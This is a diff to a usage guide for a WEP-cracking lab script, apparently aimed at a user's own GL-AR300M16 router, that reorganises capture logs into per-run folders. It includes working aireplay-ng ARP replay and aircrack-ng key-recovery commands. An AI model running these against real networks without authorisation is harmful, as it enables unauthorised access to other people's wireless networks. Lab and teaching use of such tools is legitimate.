@@ -56,17 +56,22 @@ sudo ./scripts/wep-crack.sh -i wlp2s0 -b 11:22:33:44:55:66 -c 6 -m active -o cap
 | `-c` | Channel the AP is on | *(required)* |
 | `-e` | AP ESSID (helps fake-auth on some APs) | *(none)* |
 | `-m` | `active` or `passive` | `active` |
-| `-o` | Output prefix; files go to `logs/` | `wepcap` |
+| `-o` | Output prefix; the files go to a new folder under `logs/` | `wepcap` |
 | `-t` | IVs gained before `aircrack-ng` runs again (first try at 5000) | `20000` |
 
 What the script does at each step, and why: see [README.md](README.md#how-the-scripts-work).
 
 ## 5. Check progress and results
 
+Each run has its own folder in `logs/`, named by the start time and the prefix, for example
+`2026-10-19_044700_cap_gl`. `<run>` below is that name.
+
 ```bash
-ls -lh logs/                                             # .cap, .csv and .key files
-grep -i 11:22:33:44:55:66 logs/cap_gl-01.csv             # column 11 ("# IV") = IVs captured so far
-cat logs/cap_gl.key                                      # recovered key, as hex (the script also prints the ASCII form)
+ls logs/                                                 # one folder per run
+ls -dt logs/*/ | head -n 1                               # the newest run folder
+ls -lh logs/<run>/                                       # .cap, .csv, .key and attack output
+grep -i 11:22:33:44:55:66 logs/<run>/cap_gl-01.csv       # column 11 ("# IV") = IVs captured so far
+cat logs/<run>/cap_gl.key                                # recovered key, as hex (the script also prints the ASCII form)
 ```
 
 ## 6. Do the same steps by hand
@@ -91,8 +96,8 @@ sudo aireplay-ng --arpreplay -b 11:22:33:44:55:66 -h $MYMAC $MON
 Crack a capture manually (`-b` picks the AP when the capture holds several):
 
 ```bash
-aircrack-ng -b 11:22:33:44:55:66 logs/cap_gl-01.cap
-aircrack-ng -q -b 11:22:33:44:55:66 -l logs/cap_gl.key logs/cap_gl-01.cap
+aircrack-ng -b 11:22:33:44:55:66 logs/<run>/cap_gl-01.cap
+aircrack-ng -q -b 11:22:33:44:55:66 -l logs/<run>/cap_gl.key logs/<run>/cap_gl-01.cap
 ```
 
 ## 7. Configure the GL-AR300M16 as the WEP target
